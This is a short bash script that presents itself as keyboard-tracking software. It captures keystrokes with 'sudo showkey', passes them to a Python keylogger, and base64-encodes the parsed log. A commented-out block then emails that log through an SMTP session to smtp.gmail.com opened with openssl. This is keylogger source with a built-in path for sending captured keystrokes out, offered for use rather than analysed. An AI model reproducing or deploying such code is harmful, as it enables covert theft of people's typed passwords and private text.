#!/bin/bash

# This application is a Keyboard Tracking Software that receives input from the keyboard using the "showkey" command and stores them in a text document called log.txt.


# Base64 encoded version of the content of the file
OUTPUT_CONTENT_BASE64=$(base64 -w 0 output.log)


touch log.txt
touch output.log

sudo showkey > ./log.txt # Captures all entered characters and stores them in log.txt file.

python keylogger.py # It runs Python code and tracks all key characters using log.txt and keymaps.txt files. It then stores the results in a parsed form in the "output.log" file.

: '
# SMTP server and port information
SMTP_Server="smtp.gmail.com"
SMTP_PORT="465"

# E-mail key and base64 version of the e-mail address
MAIL_BASE64=$(echo -n "email_address" | base64)
MAIL_KEY_BASE64=$(echo -n "email_key" | base64)

{
echo "EHLO localhost"
echo "AUTH LOGIN"
echo $MAIL_BASE64
echo $MAIL_KEY_BASE64
echo "MAIL FROM: <email_sender>"
echo "RCPT TO: <email_recipient>"
echo "DATA"
echo "Subject: Keyboard Tracking"
echo "Content-Type: text/plain; charset=UTF-8"
echo "Content-Transfer-Encoding: base64"
echo ""
echo "$OUTPUT_CONTENT_BASE64"
echo "."
echo "QUIT"
} | openssl s_client -connect smtp.gmail.com:465 -crlf -ign_eof
'